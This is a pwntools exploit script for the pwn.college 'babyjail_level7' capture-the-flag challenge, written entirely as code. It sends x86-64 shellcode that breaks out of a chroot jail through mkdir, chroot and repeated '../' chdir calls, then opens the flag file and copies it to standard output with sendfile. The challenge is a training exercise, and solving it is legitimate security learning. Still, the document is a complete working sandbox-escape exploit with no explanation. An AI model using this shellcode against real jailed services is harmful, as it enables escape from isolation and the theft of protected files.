from pwn import *
e=context.binary=ELF("./babyjail_level7")
if args.SSH:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key")
    s.checksec(0)
    p=s.process(["/challenge/babyjail_level7","/"])
if args.LOCAL:
    p=e.process(argv=["/"])
if args.GDB:
    gdb.attach(p,gdbscript="""
    b *main+1690
    """)
context.log_level='debug'
pause()
p.recvuntil(b"Reading 0x1000 bytes of shellcode from stdin")
shellcode=asm("""
xor rax, rax
mov rax, 0x657061637365
push rax
push rsp

xor rsi, rsi 
mov rdi, [RSP + 0] 
mov rax, 0x53
syscall 
add RSP, 16

xor rax, rax
mov rax, 0x657061637365
push rax
push rsp

mov rdi, [RSP + 0] 
mov rax, 0xa1
syscall 
add RSP, 16

xor rax, rax
mov rax, 0x2f2e2e2f2e2e2f
push rax
mov rax, 0x2e2e2f2e2e2f2e2e
push rax
push rsp

mov rdi, [RSP + 0] 
mov rax, 0x50
syscall 
add RSP, 24

xor rax, rax
mov eax, 0x67616c66
push rax
push rsp

xor rsi, rsi 
mov rdi, [RSP + 0] 
mov rax, 0x2
syscall 
add RSP, 16

mov r10, 0x40
xor rdx, rdx 
mov rsi, 0x4
mov rdi, 0x1
mov rax, 0x28
syscall 
""")
p.sendline(shellcode)
p.interactive()